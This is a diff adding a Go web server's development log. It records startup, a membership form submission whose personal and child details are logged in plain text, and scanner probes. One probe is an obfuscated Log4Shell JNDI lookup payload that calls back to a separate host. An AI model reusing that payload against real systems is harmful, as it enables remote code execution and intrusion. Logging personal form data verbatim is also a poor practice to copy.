@@ -1,0 +1,41 @@
+2025/05/20 23:35:10 [INFO] 2025-05-20 23:35:10 CDT logger.go:85 - Logger initialized, writing to logs/devlog_2025-05-20.log
+2025/05/20 23:35:10 [INFO] 2025-05-20 23:35:10 CDT main.go:51 - Environment and paths loaded. Logger ready.
+2025/05/20 23:35:10 [FATAL] 2025-05-20 23:35:10 CDT main.go:56 - Failed to initialize SQLite DB: unable to open database file: out of memory (14)
+2025/05/20 23:36:16 [INFO] 2025-05-20 23:36:16 CDT logger.go:85 - Logger initialized, writing to logs/devlog_2025-05-20.log
+2025/05/20 23:36:16 [INFO] 2025-05-20 23:36:16 CDT main.go:51 - Environment and paths loaded. Logger ready.
+2025/05/20 23:36:16 [INFO] 2025-05-20 23:36:16 CDT config.go:205 - Using PayPal Sandbox environment
+2025/05/20 23:36:16 [INFO] 2025-05-20 23:36:16 CDT config.go:61 - Running in development environment
+2025/05/20 23:36:16 [INFO] 2025-05-20 23:36:16 CDT main.go:143 - Starting server on 0.0.0.0:5051
+2025/05/20 23:38:25 [INFO] 2025-05-20 23:38:25 CDT logger.go:122 - HTTP GET /csrf-token from 127.0.0.1
+2025/05/20 23:38:25 [INFO] 2025-05-20 23:38:25 CDT main.go:197 - GET /api/csrf-token took 1.735346ms
+2025/05/20 23:39:11 [INFO] 2025-05-20 23:39:11 CDT logger.go:122 - HTTP POST /submit-form from 127.0.0.1
+2025/05/20 23:39:11 [INFO] 2025-05-20 23:39:11 CDT form.go:85 - Form values received: map[csrf_token:[24o+lwleCyWdb33PABykq8Wj3SbU5e84Fso3esSPgJ4=] describe:[supporter] email:[henryjames@authors.net] form_type:[membership] full_name:[Henry James] hidden_field:[] interests:[assisting-teacher] membership_status:[first-time] school:[hurst-hills-fish] student_1_grade:[3] student_1_name:[Wolf James] student_2_grade:[5] student_2_name:[Yannis Games] student_count:[2]]
+2025/05/20 23:39:11 [INFO] 2025-05-20 23:39:11 CDT form.go:57 - Stat update: total_submissions = 1
+2025/05/20 23:39:11 [INFO] 2025-05-20 23:39:11 CDT form.go:175 - Form membership-2025-05-20_23-39-11-AH8Ozg accepted and saved successfully
+2025/05/20 23:39:11 [INFO] 2025-05-20 23:39:11 CDT form.go:57 - Stat update: successful_submissions = 1
+2025/05/20 23:39:11 [INFO] 2025-05-20 23:39:11 CDT form.go:305 - Form submitted: type=membership, formID=membership-2025-05-20_23-39-11-AH8Ozg, ip=127.0.0.1, time=2025-05-20 23:39:11
+2025/05/20 23:39:11 [INFO] 2025-05-20 23:39:11 CDT main.go:197 - POST /api/submit-form took 4.131646ms
+2025/05/20 23:39:11 [INFO] 2025-05-20 23:39:11 CDT logger.go:122 - HTTP GET /order-details from 127.0.0.1
+2025/05/20 23:39:11 [INFO] 2025-05-20 23:39:11 CDT main.go:197 - GET /api/order-details took 1.224059ms
+2025/05/20 23:44:56 [INFO] 2025-05-20 23:44:56 CDT info.go:17 - Loading template from templates/info.tmpl
+2025/05/20 23:44:56 [INFO] 2025-05-20 23:44:56 CDT logger.go:122 - HTTP GET /info from 127.0.0.1
+2025/05/20 23:44:56 [INFO] 2025-05-20 23:44:56 CDT main.go:197 - GET /info took 3.212405ms
+2025/05/21 02:10:03 [INFO] 2025-05-21 02:10:03 CDT security.go:99 - CSRF token cleanup ran (hourly log)
+2025/05/21 04:09:41 [INFO] 2025-05-21 04:09:41 CDT security.go:99 - CSRF token cleanup ran (hourly log)
+2025/05/21 06:01:28 [INFO] 2025-05-21 06:01:28 CDT security.go:99 - CSRF token cleanup ran (hourly log)
+2025/05/21 06:24:17 [INFO] 2025-05-21 06:24:17 CDT logger.go:122 - HTTP GET /order-details from 127.0.0.1
+2025/05/21 06:24:17 [INFO] 2025-05-21 06:24:17 CDT main.go:197 - GET /api/order-details took 38.803082ms
+2025/05/21 06:31:28 [INFO] 2025-05-21 06:31:28 CDT security.go:99 - CSRF token cleanup ran (hourly log)
+2025/05/21 06:34:50 [INFO] 2025-05-21 06:34:50 CDT logger.go:122 - HTTP GET /order-details from 127.0.0.1
+2025/05/21 06:34:50 [INFO] 2025-05-21 06:34:50 CDT main.go:197 - GET /api/order-details took 1.570758ms
+2025/05/21 06:34:58 [INFO] 2025-05-21 06:34:58 CDT logger.go:122 - HTTP GET /order-details from 127.0.0.1
+2025/05/21 06:34:58 [INFO] 2025-05-21 06:34:58 CDT main.go:197 - GET /api/order-details took 646.954µs
+2025/05/21 07:24:40 [INFO] 2025-05-21 07:24:40 CDT main.go:226 - 404 not found: /onvif/device_service
+2025/05/21 07:24:40 [INFO] 2025-05-21 07:24:40 CDT main.go:197 - POST /onvif/device_service took 1.917242ms
+2025/05/21 07:24:50 [INFO] 2025-05-21 07:24:50 CDT main.go:226 - 404 not found: /
+2025/05/21 07:24:50 [INFO] 2025-05-21 07:24:50 CDT main.go:197 - GET / took 397.624µs
+2025/05/21 07:24:50 [INFO] 2025-05-21 07:24:50 CDT main.go:226 - 404 not found: /${j${lower:n}${::-d}${env:TEST:-i}:d${lower:n}s://192.168.1.254:39445/NtacBkEYnJfZyttjhKRBVfLbuWneAufP}
+2025/05/21 07:24:50 [INFO] 2025-05-21 07:24:50 CDT main.go:197 - GET /${j${lower:n}${::-d}${env:TEST:-i}:d${lower:n}s://192.168.1.254:39445/NtacBkEYnJfZyttjhKRBVfLbuWneAufP} took 126.202µs
+2025/05/21 07:25:00 [INFO] 2025-05-21 07:25:00 CDT main.go:226 - 404 not found: /
+2025/05/21 07:25:00 [INFO] 2025-05-21 07:25:00 CDT main.go:197 - POST / took 169.168µs
+2025/05/21 09:02:15 [INFO] 2025-05-21 09:02:15 CDT security.go:99 - CSRF token cleanup ran (hourly log)
